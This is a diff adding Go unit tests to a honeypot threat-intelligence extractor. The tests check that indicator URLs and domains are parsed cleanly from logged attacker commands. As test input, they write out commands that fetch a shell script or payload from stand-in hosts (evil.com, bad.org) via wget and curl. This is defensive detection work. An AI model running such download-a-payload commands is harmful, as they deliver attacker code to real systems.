@@ -2,6 +2,7 @@ package intelligence
 
 import (
 	"fmt"
+	"strings"
 	"testing"
 	"time"
 
@@ -233,5 +234,43 @@ func TestExtractStress(t *testing.T) {
 		if len(iocs) == 0 {
 			t.Errorf("iteration %d: expected IOCs, got none", i)
 		}
+	}
+}
+
+// TestExtractURLTrimsTrailingPunctuation guards that over-captured trailing
+// shell punctuation is stripped so identical URLs dedupe to one IOC.
+func TestExtractURLTrimsTrailingPunctuation(t *testing.T) {
+	e := NewExtractor()
+	ev := &database.Event{Honeypot: "cowrie", EventType: "command",
+		Command: "wget http://evil.com/x.sh; curl http://evil.com/x.sh)", Timestamp: time.Now().UTC()}
+	var urls []string
+	for _, i := range e.Extract(ev) {
+		if i.Type == IOCTypeURL {
+			urls = append(urls, i.Value)
+		}
+	}
+	for _, u := range urls {
+		if strings.HasSuffix(u, ";") || strings.HasSuffix(u, ")") {
+			t.Errorf("URL %q retains trailing punctuation", u)
+		}
+		if u != "http://evil.com/x.sh" {
+			t.Errorf("URL = %q, want http://evil.com/x.sh", u)
+		}
+	}
+}
+
+// TestExtractFTPYieldsDomain guards that ftp:// URLs produce a domain IOC.
+func TestExtractFTPYieldsDomain(t *testing.T) {
+	e := NewExtractor()
+	ev := &database.Event{Honeypot: "cowrie", EventType: "command",
+		Command: "curl ftp://bad.org/payload", Timestamp: time.Now().UTC()}
+	var gotDomain bool
+	for _, i := range e.Extract(ev) {
+		if i.Type == IOCTypeDomain && i.Value == "bad.org" {
+			gotDomain = true
+		}
+	}
+	if !gotDomain {
+		t.Error("ftp:// URL did not produce the expected domain IOC bad.org")
 	}
 }
